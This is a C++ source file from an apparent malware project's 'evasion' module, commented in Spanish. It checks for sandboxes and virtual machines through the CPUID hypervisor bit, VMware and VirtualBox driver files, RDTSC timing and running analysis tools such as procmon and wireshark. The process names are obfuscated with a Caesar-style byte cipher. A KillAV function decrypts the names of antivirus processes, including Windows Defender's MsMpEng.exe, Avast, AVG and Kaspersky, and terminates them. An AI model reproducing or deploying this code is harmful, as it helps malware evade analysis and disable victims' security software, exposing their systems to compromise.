#include "evasion/Sandbox.h"
#include "Obfuscator.h"

Sandbox::Sandbox() {};

BOOL Sandbox::DetectSandbox() {
    // Unificar todas las detecciones
    return IsHypervisorBitEnabled() || isDriversExists() || IsRDTSCLatency() || IsSandboxProcess();
}

BOOL Sandbox::IsHypervisorBitEnabled() {
	int cpuInfo[4] = { 0 };
	__cpuidex(cpuInfo, 1, 0);

	BOOL isHypervisorPresent = (cpuInfo[2] >> 31) & 1;

    return isHypervisorPresent;
}

BOOL Sandbox::isDriversExists() {
    std::vector<std::string> vmFiles = {
        "C:\\windows\\system32\\drivers\\vmmouse.sys", // VMware
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",  // VMware
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys", // VirtualBox
        "C:\\windows\\system32\\drivers\\VBoxGuest.sys"  // VirtualBox
    };

    for (const auto& file : vmFiles) {
        DWORD fileAttrib = GetFileAttributesA(file.c_str());
        if (fileAttrib != INVALID_FILE_ATTRIBUTES) {
            std::cerr << "Sistema detectado como máquina virtual debido a: " << file << std::endl;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL Sandbox::IsRDTSCLatency() {
    int cpuInfo[4] = { 0 };
    __cpuidex(cpuInfo, 1, 0);

    BOOL isHypervisorPresent = (cpuInfo[2] >> 31) & 1;

    // Verificar la latencia del RDTSC usando intrinsics
    unsigned __int64 start, end;

    // Leer el contador de tiempo antes
    start = __rdtsc();

    // Realizar alguna instrucción o bucle corto
    for (int i = 0; i < 1000000; i++) {}

    // Leer el contador de tiempo después
    end = __rdtsc();

    // Si la diferencia es demasiado grande, probablemente estamos en una VM
    if ((end - start) > 1000000) {
        std::cerr << "Posible detección de máquina virtual usando latencia de RDTSC" << std::endl;
        return TRUE;
    }

    return FALSE;
}

DWORD Sandbox::GetProcessIdByName(const std::string& processName) {
    DWORD processID = 0;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Tomar una instantánea de todos los procesos del sistema
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Error al tomar snapshot de procesos" << std::endl;
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Obtener la primera entrada del snapshot
    if (!Process32First(hProcessSnap, &pe32)) {
        std::cerr << "Error al obtener la primera entrada de proceso" << std::endl;
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Iterar sobre todos los procesos para encontrar el que coincida con el nombre
    do {
        // Convertir WCHAR (pe32.szExeFile) a char*
        char exeFileName[MAX_PATH];
        int conversionResult = WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, exeFileName, MAX_PATH, NULL, NULL);

        // Verificar si la conversión fue exitosa
        if (conversionResult > 0) {
            // Comparar el nombre del proceso (insensible a mayúsculas/minúsculas)
            if (_stricmp(exeFileName, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;  // Proceso encontrado, salir del bucle
            }
        }
        else {
            std::cerr << "Error al convertir WCHAR a char*" << std::endl;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return processID;
}

BOOL Sandbox::IsSandboxProcess() {
    std::vector<std::vector<unsigned char>> analysisTools = {
        // Valores de procmon.exe
        { 0x4e, 0x50, 0x4d, 0x41, 0x4b, 0x4d, 0x4c, 0x0c, 0x43, 0x56, 0x43 },
        // Valores de wireshark.exe
        { 0x55, 0x47, 0x50, 0x43, 0x51, 0x46, 0x3f, 0x50, 0x49, 0x0c, 0x43, 0x56, 0x43 },
        // Valores de vboxservice.exe
        { 0x54, 0x40, 0x4d, 0x56, 0x51, 0x43, 0x50, 0x54, 0x47, 0x41, 0x43, 0x0c, 0x43, 0x56, 0x43 }
    };

    for (std::vector<unsigned char>& toolBytes : analysisTools) {
        // Desencriptamos el nombre del proceso utilizando decryptCaesar
        std::string toolName = Obfuscator::decryptCaesar(toolBytes, 0xDE);

        // Obtener el Process ID del proceso si está corriendo
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetProcessIdByName(toolName));
        if (hProcess != NULL) {
            CloseHandle(hProcess);
            return TRUE;  // Sandbox detectada
        }
    }
    return FALSE;
}

VOID Sandbox::KillAV() {
    std::vector<std::vector<unsigned char>> avProcesses = {
        // MsMpEng.exe
        { 0x2b, 0x51, 0x2b, 0x4e, 0x23, 0x4c, 0x45, 0x0c, 0x43, 0x56, 0x43 },
        // avastUI.exe
        { 0x3f, 0x54, 0x3f, 0x51, 0x52, 0x33, 0x27, 0x0c, 0x43, 0x56, 0x43 },
        // avg.exe
        { 0x3f, 0x54, 0x45, 0x0c, 0x43, 0x56, 0x43 },
        // kav.exe
        { 0x49, 0x3f, 0x54, 0x0c, 0x43, 0x56, 0x43 }
    };

    for (std::vector<unsigned char>& avBytes : avProcesses) {
        std::string avName = Obfuscator::decryptCaesar(avBytes, 0xDE);

        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, GetProcessIdByName(avName));
        if (hProcess != NULL) {
            TerminateProcess(hProcess, 0);  // Terminar el proceso
            CloseHandle(hProcess);
        }
    }
}
